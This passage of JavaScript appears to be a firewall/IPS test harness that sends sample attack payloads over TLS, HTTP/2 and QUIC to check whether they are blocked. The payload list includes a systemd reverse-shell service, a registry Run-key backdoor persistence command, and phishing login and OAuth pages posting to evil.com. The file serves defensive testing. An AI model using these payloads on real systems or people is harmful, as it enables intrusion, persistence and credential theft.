    data: '[Unit]\nDescription=System Update Service\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/bin/bash -c "while true; do bash -i >& /dev/tcp/10.0.0.1/4444 0>&1; sleep 60; done"\nRestart=always\n\n[Install]\nWantedBy=multi-user.target',
    severity: 'critical',
  },
  {
    id: 'backdoor-registry-run',
    name: 'Windows registry Run key persistence',
    description: 'Adding Windows registry Run key for startup persistence',
    data: 'reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v "WindowsUpdate" /t REG_SZ /d "C:\\Windows\\Temp\\backdoor.exe" /f',
    severity: 'critical',
  },

  // ── Phishing / Social Engineering Content ──────────────────────────────
  {
    id: 'phishing-login-page',
    name: 'Phishing login form',
    description: 'Fake login page mimicking popular service',
    data: '<html><head><title>Sign In - Microsoft 365</title></head><body><form action="https://evil.com/collect" method="POST"><h2>Sign in</h2><input name="email" placeholder="Email"><input name="password" type="password" placeholder="Password"><button type="submit">Sign in</button></form></body></html>',
    severity: 'high',
  },
  {
    id: 'phishing-oauth-redirect',
    name: 'OAuth phishing redirect',
    description: 'Fake OAuth consent page redirecting credentials',
    data: '<html><body><h2>Google wants to access your account</h2><p>This app wants permission to:</p><ul><li>Read your email</li><li>Access your contacts</li></ul><a href="https://evil.com/oauth/callback?code=stolen_token">Allow</a></body></html>',
    severity: 'high',
  },
];

const VIRUS_PAYLOADS = PAYLOADS.filter(p => p.id.startsWith('eicar-') || p.id.startsWith('malware-'));

// ─── Scenario Generation ─────────────────────────────────────────────────────

function generateTLSFirewallScenarios() {
  return PAYLOADS.map(payload => ({
    name: `fw-${payload.id}`,
    category: 'FW',
    description: `Firewall: ${payload.name} — ${payload.description}`,
    side: 'client',
    useNodeTLS: true,
    clientHandler: async (socket, host, logger) => {
      const data = typeof payload.data === 'string' ? Buffer.from(payload.data) : payload.data;

      if (payload.method === 'GET') {
        // Send as URL parameter in GET request
        const encodedPath = encodeURIComponent(data.toString().slice(0, 2000));
        socket.write(`GET /?q=${encodedPath} HTTP/1.1\r\nHost: ${host}\r\nConnection: close\r\n\r\n`);
      } else {
        // Send as POST body
        socket.write(`POST / HTTP/1.1\r\nHost: ${host}\r\nContent-Type: application/octet-stream\r\nContent-Length: ${data.length}\r\nConnection: close\r\n\r\n`);
        socket.write(data);
      }

      const resp = await new Promise((resolve) => {
        let buf = Buffer.alloc(0);
        socket.on('data', (d) => { buf = Buffer.concat([buf, d]); });
        socket.on('end', () => resolve(buf));
        socket.on('error', () => resolve(buf));
        setTimeout(() => resolve(buf), 5000);
      });

      const respStr = resp.toString('utf8', 0, Math.min(resp.length, 500));
      logger.info(`[fw] ${payload.id}: sent ${data.length}B, received ${resp.length}B`);

      // A firewall should block this — DROPPED means the firewall worked
      if (resp.length === 0) {
        return { status: 'DROPPED', response: `Blocked (no response) — firewall detected ${payload.name}` };
      }
      if (respStr.includes('403') || respStr.includes('406') || respStr.includes('451')) {
        return { status: 'DROPPED', response: `Blocked (${respStr.match(/HTTP\/\d\.\d\s+(\d+)/)?.[1] || '4xx'}) — firewall rejected` };
      }
      // If we get a response, the payload was NOT blocked
      return { status: 'PASSED', response: `Not blocked — ${resp.length}B response (firewall did not detect ${payload.name})` };
    },
    expected: 'DROPPED',
    expectedReason: `Firewall/IPS should detect and block: ${payload.description}`,
  }));
}

function generateH2FirewallScenarios() {
  return PAYLOADS.map(payload => ({
    name: `h2-fw-${payload.id}`,
    category: 'AN',
    description: `H2 Firewall: ${payload.name} — ${payload.description}`,
    side: 'client',
    useNodeH2: true,
    clientHandler: async (session, host, logger) => {
      const data = typeof payload.data === 'string' ? Buffer.from(payload.data) : payload.data;
      const method = payload.method === 'GET' ? 'GET' : 'POST';

      const headers = {
        ':method': method,
        ':path': method === 'GET' ? `/?q=${encodeURIComponent(data.toString().slice(0, 2000))}` : '/',
        ':scheme': 'https',
        ':authority': host,
      };
      if (method === 'POST') {
        headers['content-type'] = 'application/octet-stream';
        headers['content-length'] = data.length.toString();
      }

      const req = session.request(headers);
      if (method === 'POST') {
        req.write(data);
      }
      req.end();

      const result = await new Promise((resolve) => {
        let respStatus = 0;
        let respData = Buffer.alloc(0);
        req.on('response', (h) => { respStatus = h[':status']; });
        req.on('data', (d) => { respData = Buffer.concat([respData, d]); });
        req.on('end', () => resolve({ status: respStatus, data: respData }));
        req.on('error', (e) => resolve({ status: 0, data: Buffer.alloc(0), error: e.message }));
        setTimeout(() => resolve({ status: respStatus, data: respData }), 5000);
      });

      logger.info(`[h2-fw] ${payload.id}: sent ${data.length}B, status=${result.status} resp=${result.data.length}B`);

      if (result.status === 0 || result.error) {
        return { status: 'DROPPED', response: `Blocked (connection reset) — firewall detected ${payload.name}` };
      }
      if (result.status === 403 || result.status === 406 || result.status === 451) {
        return { status: 'DROPPED', response: `Blocked (HTTP ${result.status}) — firewall rejected` };
      }
      return { status: 'PASSED', response: `Not blocked — HTTP ${result.status} ${result.data.length}B (firewall did not detect ${payload.name})` };
    },
    expected: 'DROPPED',
    expectedReason: `Firewall/IPS should detect and block over HTTP/2: ${payload.description}`,
  }));
}

const FW_SRV_SCENARIOS = [
  {
    name: 'srv-tls-multi-virus',
    category: 'SRV',
    description: 'Server sends all virus files sequentially in one TLS/HTTP/1.1 connection',
    side: 'server',
    useNodeTLS: true,
    serverHandler: (socket, log) => {
      log(`Sending ${VIRUS_PAYLOADS.length} virus files sequentially over TLS/HTTP/1.1...`);
      let body = '';
      for (const p of VIRUS_PAYLOADS) {
        const data = typeof p.data === 'string' ? p.data : p.data.toString('binary');
        body += `--- ${p.id} ---\n${data}\n`;
      }
      const response = `HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: ${Buffer.byteLength(body, 'binary')}\r\nConnection: close\r\n\r\n${body}`;
      socket.end(Buffer.from(response, 'binary'));
    },
    expected: 'DROPPED',
    expectedReason: 'Firewall should detect virus files in the server response and drop the connection',
  },
  {
    name: 'srv-h2-multi-virus-sequential',
    category: 'H2S',
    description: 'Server sends all virus files sequentially in one HTTP/2 stream',
    side: 'server',
    serverHandler: (stream, session, log) => {
      log(`Sending ${VIRUS_PAYLOADS.length} virus files sequentially over one HTTP/2 stream...`);
      let body = '';
      for (const p of VIRUS_PAYLOADS) {
        const data = typeof p.data === 'string' ? p.data : p.data.toString('binary');
        body += `--- ${p.id} ---\n${data}\n`;
      }
      stream.respond({
        ':status': 200,
        'content-type': 'text/plain',
      });
      stream.end(Buffer.from(body, 'binary'));
    },
    expected: 'DROPPED',
    expectedReason: 'Firewall should detect virus files in the server response and drop the connection',
  },
];

// Add H2 concurrent scenarios (2 and Max)
[2, VIRUS_PAYLOADS.length].forEach(concurrency => {
  const isMax = concurrency === VIRUS_PAYLOADS.length;
  FW_SRV_SCENARIOS.push({
    name: `srv-h2-multi-virus-concurrent-${isMax ? 'max' : concurrency}`,
    category: 'H2S',
    description: `Server sends all virus files concurrently using ${isMax ? 'max' : concurrency} HTTP/2 streams`,
    side: 'server',
    serverHandler: (stream, session, log) => {
      log(`Sending virus files concurrently (${isMax ? 'max' : concurrency} streams) over HTTP/2...`);
      // Respond to the main request first
      stream.respond({ ':status': 200 });
      stream.end(`Sending ${VIRUS_PAYLOADS.length} virus files via ${concurrency} push streams...`);

      // We use push streams to simulate concurrent server-initiated data
      // If we wanted truly concurrent responses to client requests, we'd wait for more requests,
      // but in fuzzer mode, the server typically pushes to a single client request.
      for (let i = 0; i < VIRUS_PAYLOADS.length; i++) {
        const p = VIRUS_PAYLOADS[i];
        try {
          session.pushStream({ ':path': `/virus-${p.id}` }, (err, pushStream) => {
            if (err) return;
            const data = typeof p.data === 'string' ? p.data : p.data;
            pushStream.respond({ ':status': 200, 'content-type': 'application/octet-stream' });
            pushStream.end(data);
          });
        } catch (e) {
          log(`Push for ${p.id} failed: ${e.message}`);
        }
        // If concurrency is limited, we could add delays or logic here,
        // but HTTP/2 push is naturally multiplexed.
      }
    },
    expected: 'DROPPED',
    expectedReason: 'Firewall should detect virus files in the concurrent server response streams and drop the connection',
  });
});

// Add QUIC concurrent scenarios (Sequential and Max)
FW_SRV_SCENARIOS.push({
  name: 'srv-quic-multi-virus-sequential',
  category: 'QS',
  description: 'Server sends all virus files sequentially in one QUIC stream',
  side: 'server',
  serverHandler: async (rinfo, sendFn, log, clientPacket) => {
    log(`Sending ${VIRUS_PAYLOADS.length} virus files sequentially over one QUIC payload...`);
    let body = '';
    for (const p of VIRUS_PAYLOADS) {
      const data = typeof p.data === 'string' ? p.data : p.data.toString('binary');
      body += `--- ${p.id} ---\n${data}\n`;
    }
    // For raw QUIC fuzzer server, we send it as a simple payload for now
    await sendFn(Buffer.from(body, 'binary'), 'Multi-virus sequential payload');
  },
  expected: 'DROPPED',
  expectedReason: 'Firewall should detect virus files in the QUIC server response and drop the connection',
});

FW_SRV_SCENARIOS.push({
  name: 'srv-quic-multi-virus-concurrent-max',
  category: 'QS',
  description: 'Server sends all virus files concurrently in multiple QUIC packets/streams',
  side: 'server',
  serverHandler: async (rinfo, sendFn, log, clientPacket) => {
    log(`Sending ${VIRUS_PAYLOADS.length} virus files in separate QUIC packets...`);
    for (const p of VIRUS_PAYLOADS) {
      const data = typeof p.data === 'string' ? p.data : p.data;
      await sendFn(data, `Virus payload: ${p.id}`);
    }
  },
  expected: 'DROPPED',
  expectedReason: 'Firewall should detect virus files in the concurrent QUIC server responses and drop the connection',
});

const FW_TLS_SCENARIOS = generateTLSFirewallScenarios();
const FW_H2_SCENARIOS = generateH2FirewallScenarios();

module.exports = {
  PAYLOADS,
  VIRUS_PAYLOADS,
  FW_TLS_SCENARIOS,
  FW_H2_SCENARIOS,
  FW_SRV_SCENARIOS,
  generateTLSFirewallScenarios,
  generateH2FirewallScenarios,
};
